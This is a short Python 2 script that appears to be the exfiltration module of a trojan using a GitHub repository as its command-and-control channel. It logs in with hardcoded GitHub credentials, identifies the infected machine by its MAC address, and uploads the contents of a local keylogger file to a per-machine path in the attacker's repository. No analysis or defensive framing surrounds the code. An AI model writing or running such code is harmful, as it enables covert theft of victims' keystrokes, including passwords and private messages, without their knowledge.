import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os
import wmi
import pythoncom

from github3 import *


def connect_to_github():
    gh = login(username="OXVyeah", password="heiya233")
    #print(gh)
    repo = gh.repository("OXVyeah", "TROyeah")
    return repo

def network(): 
    c = wmi.WMI ()
    for interface in c.Win32_NetworkAdapterConfiguration (IPEnabled=1): 
        print "MAC: %s" % interface.MACAddress 
        return str(interface.MACAddress).replace(":","-")


def upKeyboard(rep,msg,pcname):
    if rep.contents("data/"+pcname+"/keyboard.txt") == None :
#	print "ip"
        rep.create_file("data/"+pcname+"/keyboard.txt",pcname +" keyboard autosave file create",msg)
    con = rep.contents("data/"+pcname+"/keyboard.txt")

    upFile(con,msg,"upload keyboard")


#
def upFile(oricon,msg,comment):
    if oricon == None : print "dont have such file\n" ;return;
    oricon.update(comment,msg)


def run(m):
    pythoncom.CoInitialize()
    repo=connect_to_github()
    fileHandel = None
    
    print "write"
    fileHandle=open ("C:/temp/keylogger.txt", 'r' )
    msg = fileHandle.read()
    upKeyboard(repo,msg,m)
    fileHandle.close()


